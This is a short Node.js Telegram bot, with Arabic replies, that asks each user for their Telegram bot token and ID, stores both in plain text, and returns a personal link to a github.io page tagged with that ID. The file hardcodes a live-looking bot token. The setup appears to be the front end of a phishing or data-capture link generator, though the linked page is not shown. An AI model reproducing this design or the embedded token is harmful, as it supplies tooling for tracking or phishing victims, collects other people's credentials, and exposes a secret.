import { Telegraf } from 'telegraf';
import fs from 'fs';

const mainBot = new Telegraf('8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4');

function loadUsers() {
  try {
    return JSON.parse(fs.readFileSync('users.json'));
  } catch {
    return {};
  }
}

function saveUsers(users) {
  fs.writeFileSync('users.json', JSON.stringify(users, null, 2));
}

const users = loadUsers();

mainBot.start((ctx) => {
  ctx.reply('👋 أهلاً بك، ما هو اسمك؟ 🤔');
});

mainBot.on('text', (ctx) => {
  const chatId = ctx.chat.id.toString();
  const text = ctx.message.text;
  
  if (!users[chatId]) users[chatId] = {};
  
  if (!users[chatId].token && text.includes(':')) {
    users[chatId].token = text;
    ctx.reply('🔒 أرسل الآن الـ ID الخاص بك:');
    saveUsers(users);
  } else if (!users[chatId].id && /^\d{9,}$/.test(text)) {
    users[chatId].id = text;
    ctx.reply(`✅ تم الحفظ بنجاح!
📎 رابطك الخاص:
https://qwertyuiopqw12.github.io/Boot-/?ref=${text}`);
    saveUsers(users);
  } else if (!users[chatId].token || !users[chatId].id) {
    ctx.reply('⚠️ أرسل التوكن (Token) أو الـ ID فقط.');
  } else {
    ctx.reply('✅ بياناتك مسجلة مسبقًا.');
  }
});

mainBot.launch();
console.log('🤖 البوت شغّال بنجاح!');

// (اختياري): يمنع Render من إيقاف الخدمة
setInterval(() => {}, 1000);